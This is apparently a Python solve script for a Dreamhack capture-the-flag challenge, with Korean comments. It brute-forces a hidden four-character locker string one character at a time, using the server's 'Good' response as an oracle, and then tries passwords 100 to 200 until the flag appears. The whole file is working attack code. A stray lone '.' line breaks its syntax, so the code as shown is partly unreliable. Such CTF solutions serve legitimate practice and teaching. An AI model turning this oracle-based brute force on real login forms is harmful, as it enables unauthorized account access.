import string
import requests

alphanumeric = string.ascii_lowercase + string.digits
url = "http://host3.dreamhack.games:14694/"

session = requests.Session()

print("[*] rand_str(locker_num) 탐색 시작...")
rand_str = ""

# 1. 4자리 rand_str을 한 글자씩 찾아냅니다. (Prefix Matching)
for _ in range(4):
    found_char = False
    for char in alphanumeric:
        test_str = rand_str + char
        # 서버는 locker_num이 rand_str의 시작 부분과 일치하면 "Good"을 반환합니다.
        data = {"locker_num": test_str, "password": "0"}
        
        try:
            res = session.post(url, data=data, timeout=3)
        except requests.exceptions.RequestException:
            continue
            
        .
        if "Good" in res.text:
            rand_str = test_str
            print(f"[+] 발견된 문자열: {rand_str}")
            found_char = True
            break
            
    if not found_char:
        print("[-] 문자열 찾기 실패")
        break

print(f"\n[+] 완성된 rand_str: {rand_str}")

# 2. rand_num(100 ~ 200)을 찾아냅니다.
print("[*] rand_num 탐색 시작...")
for num in range(100, 201):
    data = {"locker_num": rand_str, "password": str(num)}
    
    try:
        res = session.post(url, data=data, timeout=3)
    except requests.exceptions.RequestException:
        continue
        
    if "FLAG" in res.text:
        print(f"\n[+] 성공! 비밀번호(숫자): {num}")
        print(res.text)
        break
